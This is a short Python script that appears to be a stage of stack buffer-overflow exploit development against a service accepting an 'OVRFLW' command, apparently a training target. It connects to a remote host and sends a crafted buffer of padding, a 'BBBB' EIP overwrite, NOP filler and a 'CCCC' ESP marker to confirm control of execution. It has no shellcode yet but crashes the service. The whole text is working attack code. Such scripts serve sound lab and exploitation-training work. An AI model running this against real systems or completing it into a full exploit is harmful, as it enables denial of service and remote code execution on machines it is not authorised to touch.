#!/usr/bin/env python3
import socket

from PARAMETERS import RHOST, RPORT, buf_totlen, offset_eip, offset_esp

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = b""
buf += b"A"*(offset_eip - len(buf))      	# padding
buf += b"BBBB"                           	# EIP overwrite
buf += b"\x90"*(offset_esp - offset_eip - 4)# Padding between EIP and ESP
buf += b"CCCC"                           	# ESP overwrite
buf += b"D"*(buf_totlen - len(buf))      	# trailing padding
buf += b"\n"

s.send(b"OVRFLW " + buf + b"\n")
